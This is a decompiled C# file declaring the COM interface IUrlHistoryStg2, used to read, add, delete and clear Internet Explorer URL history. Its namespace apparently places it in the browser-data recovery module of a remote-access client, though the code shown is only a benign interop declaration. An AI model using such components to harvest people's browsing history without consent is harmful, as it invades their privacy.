using System;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000CF RID: 207
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("AFA0DC11-C313-11D0-831A-00C04FD5AE38")]
	[ComImport]
	public interface IUrlHistoryStg2 : IUrlHistoryStg
	{
		// Token: 0x0600052E RID: 1326
		void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags);

		// Token: 0x0600052F RID: 1327
		void DeleteUrl(string pocsUrl, int dwFlags);

		// Token: 0x06000530 RID: 1328
		void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags, ref STATURL lpSTATURL);

		// Token: 0x06000531 RID: 1329
		void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut);

		// Token: 0x170000F2 RID: 242
		// (get) Token: 0x06000532 RID: 1330
		object EnumUrls { [return: MarshalAs(UnmanagedType.IUnknown)] get; }

		// Token: 0x06000533 RID: 1331
		void AddUrlAndNotify(string pocsUrl, string pocsTitle, int dwFlags, int fWriteHistory, object poctNotify, object punkISFolder);

		// Token: 0x06000534 RID: 1332
		void ClearHistory();
	}
}
